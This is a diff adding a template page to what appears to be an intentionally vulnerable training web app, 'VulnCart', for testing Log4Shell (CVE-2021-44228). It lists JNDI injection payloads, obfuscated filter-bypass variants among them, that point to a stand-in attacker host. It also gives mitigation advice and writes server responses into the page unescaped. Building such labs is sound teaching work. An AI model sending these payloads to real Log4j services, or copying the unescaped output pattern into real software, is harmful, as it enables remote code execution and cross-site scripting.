@@ -1,0 +1,157 @@
+{% extends "base.html" %}
+
+{% block title %}Log4Shell Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2021-44228: Log4Shell Vulnerability Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates the Log4Shell vulnerability (CVE-2021-44228) for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>Log4Shell Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>Log4Shell (CVE-2021-44228) is a critical vulnerability in Apache Log4j that allows remote code execution through JNDI lookups.</p>
+                
+                <form method="POST" id="log4shellForm">
+                    <div class="mb-3">
+                        <label for="payload" class="form-label">JNDI Payload:</label>
+                        <textarea class="form-control" id="payload" name="payload" rows="4" 
+                                  placeholder="Enter Log4Shell payload here...">${jndi:ldap://malicious-server.com/exploit}</textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Test Log4Shell</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>Basic JNDI Lookup:</h6>
+                <code>${jndi:ldap://malicious-server.com/exploit}</code>
+                
+                <hr>
+                
+                <h6>DNS Lookup:</h6>
+                <code>${jndi:dns://malicious-server.com/exploit}</code>
+                
+                <hr>
+                
+                <h6>RMI Lookup:</h6>
+                <code>${jndi:rmi://malicious-server.com/exploit}</code>
+                
+                <hr>
+                
+                <h6>Nested Lookup:</h6>
+                <code>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://malicious-server.com/exploit}</code>
+                
+                <hr>
+                
+                <h6>Lowercase Bypass:</h6>
+                <code>${${::-j}ndi:rmi://malicious-server.com/exploit}</code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2021-44228 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>Apache Log4j2 versions 2.0-beta9 through 2.14.1 are vulnerable to remote code execution via JNDI lookups in log messages.</p>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Remote Code Execution (RCE)</li>
+                    <li>Server-side request forgery (SSRF)</li>
+                    <li>Information disclosure</li>
+                    <li>Complete system compromise</li>
+                </ul>
+                
+                <h6>Affected Versions:</h6>
+                <ul>
+                    <li>Apache Log4j2 2.0-beta9 through 2.14.1</li>
+                    <li>Any application using vulnerable Log4j2 versions</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Update to Log4j2 2.15.0 or later</li>
+                    <li>Set system property: <code>log4j2.formatMsgNoLookups=true</code></li>
+                    <li>Remove JndiLookup class from classpath</li>
+                    <li>Use security manager to restrict JNDI lookups</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('log4shellForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const payload = document.getElementById('payload').value;
+        const resultDiv = document.getElementById('result');
+        
+        fetch('/log4shell', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'payload=' + encodeURIComponent(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong> ${data.result}
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    // Quick payload buttons
+    const payloads = [
+        '${jndi:ldap://malicious-server.com/exploit}',
+        '${jndi:dns://malicious-server.com/exploit}',
+        '${jndi:rmi://malicious-server.com/exploit}',
+        '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://malicious-server.com/exploit}'
+    ];
+    
+    payloads.forEach((payload, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = `Payload ${index + 1}`;
+        button.onclick = () => {
+            document.getElementById('payload').value = payload;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
